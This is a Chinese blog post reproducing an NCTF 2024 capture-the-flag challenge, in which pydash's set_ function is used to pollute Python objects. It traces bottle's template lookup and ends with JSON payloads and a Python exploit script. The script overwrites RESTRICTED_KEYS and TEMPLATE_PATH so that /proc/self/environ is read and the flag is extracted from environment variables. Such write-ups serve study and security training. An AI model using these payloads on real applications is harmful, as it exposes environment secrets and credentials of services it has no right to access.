---
title: Pydash set原型链污染漏洞解析
description: 该文章追溯分析了pydash的原型链污染漏洞
date: 2025-04-08
image: cover.png
categories:
    - cate1
tags:
    - Python
    - SSTI
---

## 前言

在nctf中遇到了一pydash的题目，是没见过的知识，所以写一篇文章复现分析一下。

## 2024-nctf

### 源码

```python
'''
Hints: Flag在环境变量中
'''


from typing import Optional


import pydash
import bottle



__forbidden_path__=['__annotations__', '__call__', '__class__', '__closure__',
               '__code__', '__defaults__', '__delattr__', '__dict__',
               '__dir__', '__doc__', '__eq__', '__format__',
               '__ge__', '__get__', '__getattribute__',
               '__gt__', '__hash__', '__init__', '__init_subclass__',
               '__kwdefaults__', '__le__', '__lt__', '__module__',
               '__name__', '__ne__', '__new__', '__qualname__',
               '__reduce__', '__reduce_ex__', '__repr__', '__setattr__',
               '__sizeof__', '__str__', '__subclasshook__', '__wrapped__',
               "Optional","func","render",
               ]
__forbidden_name__=[
    "bottle"
]
__forbidden_name__.extend(dir(globals()["__builtins__"]))

def setval(name:str, path:str, value:str)-> Optional[bool]:
    if name.find("__")>=0: return False
    for word in __forbidden_name__:
        if name==word:
            return False
    for word in __forbidden_path__:
        if path.find(word)>=0: return False
    obj=globals()[name]
    try:
        pydash.set_(obj,path,value)
    except:
        return False
    return True

@bottle.post('/setValue')
def set_value():
    name = bottle.request.query.get('name')
    path=bottle.request.json.get('path')
    if not isinstance(path,str):
        return "no"
    if len(name)>6 or len(path)>32:
        return "no"
    value=bottle.request.json.get('value')
    return "yes" if setval(name, path, value) else "no"

@bottle.get('/render')
def render_template():
    path=bottle.request.query.get('path')
    if path.find("{")>=0 or path.find("}")>=0 or path.find(".")>=0:
        return "Hacker"
    return bottle.template(path)
bottle.run(host='0.0.0.0', port=8999)
```

### 分析

我们拿到附件的源码。可以看到这里有两个关键的路由`/setValue`和`/render`，既然是要分析原型链污染，那么我们就主要关注

```python
pydash.set_(obj,path,value)
```

这个调用，追溯一下。

```python
def set_(obj: T, path: PathT, value: t.Any) -> T:
    """
    Sets the value of an object described by `path`. If any part of the object path doesn't exist,
    it will be created.

    Args:
        obj: Object to modify.
        path: Target path to set value to.
        value: Value to set.

    Returns:
        Modified `obj`.

    Warning:
        `obj` is modified in place.

    Example:

        >>> set_({}, "a.b.c", 1)
        {'a': {'b': {'c': 1}}}
        >>> set_({}, "a.0.c", 1)
        {'a': {'0': {'c': 1}}}
        >>> set_([1, 2], "[2][0]", 1)
        [1, 2, [1]]
        >>> set_({}, "a.b[0].c", 1)
        {'a': {'b': [{'c': 1}]}}

    .. versionadded:: 2.2.0

    .. versionchanged:: 3.3.0
        Added :func:`set_` as main definition and :func:`deep_set` as alias.

    .. versionchanged:: 4.0.0

        - Modify `obj` in place.
        - Support creating default path values as ``list`` or ``dict`` based on whether key or index
          substrings are used.
        - Remove alias ``deep_set``.
    """
    return set_with(obj, path, value)
```

大体作用就是传入一个对象obj，一个path属性名以及一个value值。就可以改掉obj对象中的path属性的值。示例如下：

```python
import pydash

class Test:
    def __init__(self):
        self.name = "test"
        self.score = 0
a = Test()
print(f"修改前{a.name}")
pydash.set_(a, "name", "test2")
print(f"修改后{a.name}")
```

运行效果：

![image-20250408161743852](/image-20250408161743852.png)

 根据源码中的提示，我们知道，flag在环境变量中，所以我们想读取flag可以通过读取`/proc/self/environ`文件来读取flag。那么我们的思路就清晰了，在`/render`路由中，调用了：

```python
bottle.template(path)
```

我们就可以通过修改渲染模板中的某个记录了模板路径的变量，来实现读取`environ`文件。那么我们现在追溯一下这个template方法，寻找一下符合条件的变量。

```python
def template(*args, **kwargs):
    """
    Get a rendered template as a string iterator.
    You can use a name, a filename or a template string as first parameter.
    Template rendering arguments can be passed as dictionaries
    or directly (as keyword arguments).
    """
    tpl = args[0] if args else None
    for dictarg in args[1:]:
        kwargs.update(dictarg)
    adapter = kwargs.pop('template_adapter', SimpleTemplate)
    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
    tplid = (id(lookup), tpl)
    if tplid not in TEMPLATES or DEBUG:
        settings = kwargs.pop('template_settings', {})
        if isinstance(tpl, adapter):
            TEMPLATES[tplid] = tpl
            if settings: TEMPLATES[tplid].prepare(**settings)
        elif "\n" in tpl or "{" in tpl or "%" in tpl or '$' in tpl:
            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
        else:
            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
    if not TEMPLATES[tplid]:
        abort(500, 'Template (%s) not found' % tpl)
    return TEMPLATES[tplid].render(kwargs)
```

我们关注这一行代码。

```python
adapter = kwargs.pop('template_adapter', SimpleTemplate)
lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
```

这里的作用是获取模板的渲染引擎，可以看到默认获取的是`SimpleTemplate`，`lookup`也就是模板的搜索路径，也就是`TEMPLATE_PATH`这个变量，默认值为：`['./', './views/']`，所以这里会从lookup所指示的目录中获取对应的模板文件，然后交给`SimpleTemplate`去解析。

```python
elif "\n" in tpl or "{" in tpl or "%" in tpl or '$' in tpl:
    TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
else:
	TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
```

这里是一个切换通过模板渲染还是字符串渲染的判断逻辑，跟进解析器。由于传入的模板路径而不是字符串，所以这里会通过lookup这个参数去寻找对应目录下的模板文件，读取后再交给解析器解析。

![image-20250408165124018](/image-20250408165124018.png)

其中`name`就是我们传入的`path`参数，假设我们传入的参数`path=test`。获取到lookup的路径后，进入`search`方法最后把`name`拼接到所有的路径中并尝试读取模板文件。

![image-20250408165310108](/image-20250408165310108.png)

当读取到文件内容后，就会交给prepare

```python
class SimpleTemplate(BaseTemplate):
    def prepare(self,
                escape_func=html_escape,
                noescape=False,
                syntax=None, **ka):
        self.cache = {}
        enc = self.encoding
        self._str = lambda x: touni(x, enc)
        self._escape = lambda x: escape_func(touni(x, enc))
        self.syntax = syntax
        if noescape:
            self._str, self._escape = self._escape, self._str
```

这个方法的作用就是初始化模板的字符处理逻辑，支持 HTML 转义或直接输出原始 HTML，也就是解析这个传入的template变成html，然后回到template结尾。进入render方法。

```python
def render(self, *args, **kwargs):
    """ Render the template using keyword arguments as local variables. """
    env = {}
    stdout = []
    for dictarg in args:
        env.update(dictarg)
    env.update(kwargs)
    self.execute(stdout, env)
    return ''.join(stdout)
```

继续追溯execute方法。

```python
def execute(self, _stdout, kwargs):
    env = self.defaults.copy()
    env.update(kwargs)
    env.update({
        '_stdout': _stdout,
        '_printlist': _stdout.extend,
        'include': functools.partial(self._include, env),
        'rebase': functools.partial(self._rebase, env),
        '_rebase': None,
        '_str': self._str,
        '_escape': self._escape,
        'get': env.get,
        'setdefault': env.setdefault,
        'defined': env.__contains__
    })
    exec(self.co, env)
    if env.get('_rebase'):
        subtpl, rargs = env.pop('_rebase')
        rargs['base'] = ''.join(_stdout)  #copy stdout
        del _stdout[:]  # clear stdout
        return self._include(env, subtpl, **rargs)
    return env
```

可以看到这里构建了`env`环境，然后在`exec`中调用了执行预编译的模板也就是`self.co`，如果这里调用了rebase方法，就会递归的去调用父模板。之后会读取`test`文件的内容，然后在`render`中返回解析的内容。

![image-20250408171306505](/image-20250408171306505.png)

到这里我们就分析完了整个利用链。整理一下：

```python
template:adapter()->class:BaseTemplate:search()->class:SimpleTemplate:prepare()->render()->exec()->stdout
```

### 利用

那么利用的思路就很简单了，我们希望读取environ文件，只需要通过`set_`方法修改`TEMPLATE_PATH`即可结合黑名单，payload如下：

```json
//POST传参
{"path":"__globals__.bottle.TEMPLATE_PATH","value":["../../../../../proc/self/"]}
//GET传参：
name=setval
```

但是`pydash`不允许修改`__globasl__`的属性，声明在`helpers.py`文件中。

![image-20250408172553144](/image-20250408172553144.png)

所以我们还要先污染一下`RESTRICTED_KEYS`

payload如下：

```json
//POST传参
{"path":"helpers.RESTRICTED_KEYS","value":"[]"}
//GET传参
name=pydash
```

我们可以得到如下python脚本：

```python
import requests,re

payload_1 = '{"path":"helpers.RESTRICTED_KEYS","value":"[]"}'
payload_2 = '{"path":"__globals__.bottle.TEMPLATE_PATH","value":["../../../../../proc/self/"]}'
url = input("url:")
headers = {"Content-Type": "application/json"}
r = requests.post(url + "/setValue?name=pydash",headers=headers, data=payload_1)
r = requests.post(url + "/setValue?name=setval",headers=headers, data=payload_2)
r = requests.get(url + "/render?path=environ")
response = r.text
flag = re.search(r'flag\{.*?\}', response)
if flag:
    print("Flag found:", flag.group())
else:
    print("Flag not found!")
```